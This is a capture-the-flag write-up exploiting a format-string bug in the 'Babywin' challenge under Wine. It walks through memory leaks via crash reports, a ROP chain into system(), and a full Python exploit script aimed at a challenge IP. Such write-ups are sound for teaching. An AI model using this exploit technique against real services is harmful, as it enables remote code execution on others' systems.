Beginner Background

This section explains the basic ideas used later in the exploit. Readers who already know format strings, pointers, calling conventions, and ROP can skip to the subsequent sections.

Format Strings

printf normally receives a fixed format string followed by matching arguments:

printf("number = %d\n", 123);

The format string tells printf what to do:

Specifier Action
%d Fetch and print an integer.
%p Fetch and print a pointer (hexadecimal value).
%s Fetch a pointer and print the string located at that address.
%c Fetch and print a single character.
%n Fetch a pointer and write the printed-character count there (4 bytes).
%hn Like %n, but writes only a 2-byte halfword.

User input should always be printed safely like this:

printf("%s", user_input);

However, Babywin does the following:

printf(user_input);
The Vulnerability Explained

Instead of safely printing our text, the program lets our text become instructions for printf. Sending %p does not print the literal characters "%p". It tells printf to fetch a value from the registers and stack that the program never intentionally supplied. This gives the attacker three important capabilities (primitives):

  1. %p leaks values from registers and the stack.
  2. %s reads arbitrary memory through a leaked/supplied pointer.
  3. %n/%hn writes to memory through a leaked/supplied pointer.

Pointers and Little Endian

A pointer is a number containing a memory address. For example, 0x140004050 points to the prompt string "> " in this program.

x86-64 stores multi-byte integers in little-endian order (least significant byte first). The pointer is packed into a payload in Python using:

struct.pack("<Q", 0x140004050)

Here, < specifies little endian, and Q represents an unsigned 64-bit integer (qword).

The Stack and ret

The stack is a memory area used for local variables, saved registers, and return addresses. The RSP register points to its current top. On x86-64, a ret instruction behaves approximately like: 

RIP = *(uint64_t *)RSP;
            RSP += 8;

RIP is the instruction pointer. If an attacker overwrites the return address at RSP, they control where execution continues when the function returns.

ROP and Windows x64 Arguments

Return-oriented programming (ROP) uses short instruction sequences already present in loaded executable code (gadgets) that end with a ret instruction. The key gadget in this exploit is:

pop rcx
            ret

The Windows x64 calling convention passes the first four function arguments in the following registers: 

argument 1 -> RCX
            argument 2 -> RDX
            argument 3 -> R8
            argument 4 -> R9

The desired execution target is system("cmd.exe /c type flag.txt"). Thus, the exploit needs to put the command string's address in RCX and then transfer execution to system.

Program Behavior

The relevant part of main starts at main = 0x140001580. The important disassembly is:

1400015f0: lea    -0x60(%rbp), %rax
1400015f4: mov    %rdx, %r8
1400015f7: mov    $0x1000, %edx
1400015fc: mov    %rax, %rcx
1400015ff: call   0x140002af0       ; fgets

...

140001621: lea    -0x60(%rbp), %rax
140001625: mov    %rax, %rcx
140001628: call   0x140002940       ; printf wrapper

In simplified C, the program is:

char buffer[0x1000];

printf("> ");

while (fgets(buffer, sizeof(buffer), stdin)) {
    buffer[strcspn(buffer, "\n")] = '\0';
    printf(buffer);                 // Vulnerability
    putchar('\r');
    printf("> ");
}

There is no menu and no heap-based interaction. Every submitted line is used directly as a format string.

Finding the Vulnerability From the Service

The first connection only displays a prompt: > . A standard first test for a possible format-string bug is sending:

AAAA.%p.%p.%p.%p

If the program used printf("%s", input), the %p sequences would remain literal. Babywin instead replaces them with hexadecimal values, proving that the input is interpreted as the format string itself. The reconnaissance payload %p %p %p %p %p %p returned:

0000000000000001
000000000021ED20
0000000000000001
7025207025207025
2520702520702520
0000000000000070

The fourth value is 0x7025207025207025. Written as little-endian bytes, it translates to %p %p %p. Those bytes came from the submitted input. This proves that format conversions consume eight-byte chunks from the input buffer. Consequently, a pointer can be placed inside the input and consumed by a later %s or %n.

Wine Crash Reports as an Information Leak

Invalid %s or %n operations crash inside Wine's UCRT implementation. Wine sends its debugger report to the same socket as the program output. Sending %s produced a report containing register values, stack contents, a backtrace, loaded module address ranges, and Wine version information.

The important stable module bases were:

babywin.exe = 0x0000000140000000
kernelbase  = 0x000000007b000000
kernel32    = 0x000000007b600000
ntdll       = 0x0000000170000000
ucrtbase    = 0x00000002c7470000

The crash report also identified the environment as:

Wine build: wine-8.0 (Debian 8.0~repack-4)
Platform: x86_64
Version: Windows 7

Addresses were identical across new connections, so ASLR was effectively disabled for this service.

Why an Invalid %s Leaks Information

%s treats its next argument as a pointer and reads bytes until it encounters a NUL byte. Sending only %s made the first argument, 0x1, act as the pointer. Reading address 0x1 caused a page fault. Wine instead started its debugger and printed the report to stdout, which was connected to the challenge socket, transforming a crash into a powerful leak.

How to Read the Wine Debugger Report

A typical Wine crash report contains several useful sections:

  • Register Dump: Snapshots of registers at the crash (e.g., rip, rsp, rax).
  • Stack Dump: Memory values around the current stack pointer RSP. This tells us if our writes reached their targets.
  • Backtrace: Nested function calls leading to the crash (e.g., ucrtbase!pf_printf_a).
  • Module List: Maps base addresses of loaded modules, crucial for converting RVAs to absolute remote addresses.

Format Argument Mapping

Windows x64 passes the first four normal function arguments in registers (RCX, RDX, R8, R9). The vulnerable function only explicitly supplies the format string in RCX. However, printf continues reading variadic arguments from the register-save and stack areas.

Experimentally, the conversion-to-buffer mapping was:

argument 1 = 0x1
argument 2 = 0x21ed20
argument 3 = 0x1
argument 4 = buffer[0:8]
argument 5 = buffer[8:16]
argument 6 = buffer[16:24]
...

For conversion number N, where N >= 4, the corresponding data begins at:

buffer_offset = (N - 4) * 8

Positional format specifiers such as %16$s were not supported by this UCRT build. All arguments therefore had to be consumed sequentially.

How the Mapping Was Found

The mapping was measured using recognizable eight-byte markers in the payload: offset 0x00: AAAAAAAA, offset 0x08: BBBBBBBB, etc., followed by many %p conversions. By observing which conversion printed which marker, we confirmed the mapping offset.

Arbitrary Read

To dereference an address with %s, the target address is placed at the buffer offset consumed by that conversion. For example, to read the string at 0x140004050 using conversion 16:

import struct

target = 0x140004050
slot = 16

fmt = b"%p" * (slot - 1) + b"%s"
offset = (slot - 4) * 8
payload = fmt.ljust(offset, b"Q")
payload += struct.pack("<Q", target)
payload += b"\n"

This successfully leaked the prompt string "> ". The primitive was limited by stopping at the first NUL byte, but it was enough to validate important addresses.

Meaning of the Read Payload

With slot = 16, the format string has 15 %p specifiers followed by one %s. The 15 %p operations advance through the sequential variadic arguments, and the 16th conversion (%s) consumes the pointer placed at buffer offset (16 - 4) * 8 = 96.

Locating system

The service used the Debian package: libwine 8.0~repack-4 amd64. The matching package was downloaded from Debian Snapshot and the DLL extracted:

curl -L https://snapshot.debian.org/file/31bda63c3489917a52ef1c2a763c5cbf611573cd -o libwine_8.deb
mkdir libwine_8 && cd libwine_8
ar x ../libwine_8.deb
bsdtar -xOf data.tar.xz ./usr/lib/x86_64-linux-gnu/wine/x86_64-windows/ucrtbase.dll > ucrtbase.dll

Using Python's pefile, the export RVA was resolved:

import pefile
pe = pefile.PE("ucrtbase.dll")
for symbol in pe.DIRECTORY_ENTRY_EXPORT.symbols:
    if symbol.name == b"system":
        print(hex(symbol.address)) # system RVA = 0x524b0

With the remote UCRT base, we calculated the absolute remote address of system:

ucrtbase base = 0x2c7470000
system RVA    =     0x524b0
--------------------------------
system        = 0x2c74c24b0

The remote arbitrary-read primitive confirmed that this address contained valid function code beginning with: push rsi; push rbx; sub rsp, 0x28.

Finding a pop rcx; ret Gadget

Calling system requires loading the command string address into the RCX register. Searching the matching ucrtbase.dll for pop rcx; ret found:

pop rcx; ret = 0x2c74a8c32

The bytes at that address were remotely verified as 59 c3. Because the byte after pop rcx (59) is ret (c3), a plain stack-alignment gadget is available at 0x2c74a8c33.

Failed Approach: IAT Overwrite

An initially attractive plan was to replace the imported function strcspn with system at the Import Address Table (IAT) entry 0x140009448. Since the program passes the user buffer in RCX before calling strcspn, replacing it would execute system(buffer).

However, writing to 0x140009448 caused a page fault on write access. The IAT was read-only at runtime, forcing the exploit to target the writable stack.

Selecting the Stack Target

The vulnerable call does not invoke UCRT directly. It calls a local MinGW printf wrapper at 0x140002940, which eventually returns through 0x140002992: ret. At that point, RSP = 0x21ed38. Therefore, the saved return address consumed by the wrapper's final ret is stored at 0x21ed38.

The input buffer begins at 0x21ed60. Both values remained stable between connections.

Intended ROP Chain

The final chain written at 0x21ed38 is:

Address Value Purpose
0x21ed38 0x00000002c74a8c32 pop rcx; ret gadget
0x21ed40 0x000000000021f060 Pointer to command string (buffer + 0x300)
0x21ed48 0x00000002c74a8c33 ret gadget (for 16-byte stack alignment)
0x21ed50 0x00000002c74c24b0 ucrtbase!system address
0x21ed58 0x0000000000000000 Exit address (crashes, but after flag is printed)

The Important Wine %hn Quirk

Normally, %hn writes 2 bytes. However, in this Wine 8.0 UCRT implementation, %hn behaved like a 32-bit write whose low 16 bits contained the intended count, spilling zeroes into the next halfword. This broke our initial ROP attempt.

Compensating for the Spill

The solution was to write the qwords as consecutive 16-bit chunks, ordered from low address to high address: A, A + 2, A + 4, A + 6. Each %hn write corrupted the next halfword, but the subsequent write immediately repaired it. The final spill landed harmlessly beyond the ROP chain.

Controlling the Printed Count

Format string writes store the number of characters printed so far. To write a specific 16-bit value:

padding = (value - (printed & 0xFFFF)) & 0xFFFF

If padding is nonzero, the exploit appends %[padding]c (e.g. %33970c) to print that many characters and advance the count, then appends %hn to write it.

Placing Write Addresses

Using the mapping buffer_offset = (conversion - 4) * 8, the exploit tracks which slot each %hn uses, and inserts the target addresses into the payload at those computed offsets.

Building and Understanding the Final Payload

The final payload is structured as follows:

  1. Active Format String: Generates character counts and executes writes. Starts with 120 %p conversions (printing 1920 characters) to shift target pointer offsets far into the input, preventing NUL byte termination in the format string itself.
  2. Filler Bytes: Padding (using 'Q's).
  3. Command String: Embedded at buffer offset 0x300 (address 0x21f060): cmd.exe /c type flag.txt\x00.
  4. Destination Pointers: Embedded at the offsets calculated for the %hn conversions.

Final Exploit

The complete exploit script can be seen below:

import struct
import socket

# Target offsets
BUFFER = 0x21ed60
WRAPPER_RETURN = 0x21ed38
COMMAND_OFFSET = 0x300

# Leaked Module Bases
UCRTBASE = 0x2c7470000

# Resolved remote addresses
SYSTEM = UCRTBASE + 0x524b0
POP_RCX_RET = UCRTBASE + 0x38c32
RET = UCRTBASE + 0x38c33

def build_payload(command: bytes) -> bytes:
    command_address = BUFFER + COMMAND_OFFSET

    chain = [
        POP_RCX_RET,
        command_address,
        RET,
        SYSTEM,
        0,
    ]

    words = []
    for qword_index, value in enumerate(chain):
        address = WRAPPER_RETURN + qword_index * 8
        for word_index in range(4):
            word = (value >> (word_index * 16)) & 0xFFFF
            words.append((address + word_index * 2, word))

    filler_count = 120
    fmt = bytearray(b"%p" * filler_count)
    conversion = filler_count
    printed = filler_count * 16
    placements = []

    for address, value in words:
        padding = (value - (printed & 0xFFFF)) & 0xFFFF
        if padding:
            fmt += f"%{padding}c".encode()
            conversion += 1
            printed += padding

        fmt += b"%hn"
        conversion += 1
        placements.append(((conversion - 4) * 8, address))

    payload_size = max(
        max(offset + 8 for offset, _ in placements),
        COMMAND_OFFSET + len(command) + 1,
    )

    payload = bytearray(b"Q" * payload_size)
    payload[:len(fmt)] = fmt
    payload[COMMAND_OFFSET:COMMAND_OFFSET + len(command)] = command
    payload[COMMAND_OFFSET + len(command)] = 0

    for offset, address in placements:
        payload[offset:offset + 8] = struct.pack("<Q", address)

    return bytes(payload) + b"\n"

def main():
    host = "45.79.125.182"
    port = 1339
    
    print("[*] Connecting to challenge service...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    # Receive initial prompt
    s.recv(1024)
    
    command = b"cmd.exe /c type flag.txt"
    payload = build_payload(command)
    
    print("[*] Sending exploit payload...")
    s.sendall(payload)
    
    # Receive output containing the flag
    response = b""
    s.settimeout(5.0)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
        
    print("[*] Extracting flag:")
    for line in response.split(b"\n"):
        if b"FLAG{" in line:
            print(line.decode().strip())

if __name__ == "__main__":
    main()

Manual Discovery Checklist

  1. Confirm format-string interpretation: Send AAAA.%p.%p.%p.%p and confirm hex output.
  2. Obtain the Wine debugger report: Reconnect and send %s to cause a crash. Log register values, stack addresses, and module bases.
  3. Map arguments to buffer offsets: Find the conversion slot offset mapping (e.g. conversion 4 maps to buffer offset 0).
  4. Verify controlled reading: Place a known pointer (like prompt 0x140004050) at the mapped offset and leak it using %s.
  5. Resolve remote functions: Use the Wine version from the report to download the exact remote DLL and calculate system base.
  6. Find a writable target: Identify the wrapper return address stack offset.
  7. Characterize %hn behavior: Determine how Wine handles the halfword writes (we discovered the 4-byte spill).
  8. Build ordered writes: Structure ROP chain halfwords from low-to-high addresses.
  9. Execute: Run payload and get flag.

Exploitation Flow

  1. Identify printf(user_input) in main.
  2. Use %p to determine the conversion-to-buffer mapping.
  3. Trigger %s crashes to obtain Wine debugger reports.
  4. Recover fixed module and stack addresses from the reports.
  5. Download the exact Wine 8.0 Debian DLL.
  6. Resolve system and find a pop rcx; ret gadget.
  7. Attempt an IAT overwrite and discover that the IAT is read-only.
  8. Locate the local printf wrapper's saved return address.
  9. Build a ROP chain that loads the command address into RCX.
  10. Discover that Wine's %hn corrupts four bytes.
  11. Repair that behavior with consecutive low-to-high halfword writes.
  12. Return into system("cmd.exe /c type flag.txt").
  13. Read the flag from the socket.

Key Takeaways

  • Wine debugger output can turn crashes into powerful address disclosures.
  • Matching the exact remote DLL version matters when using export RVAs and ROP gadgets.
  • A correct target address is useless if the destination page is read-only.
  • Runtime behavior should be verified instead of assuming standard format string semantics.
  • Sequential argument accounting is essential when positional specifiers are unavailable.
  • The %hn spill looked fatal initially, but contiguous ordered writes made it deterministic and exploitable.
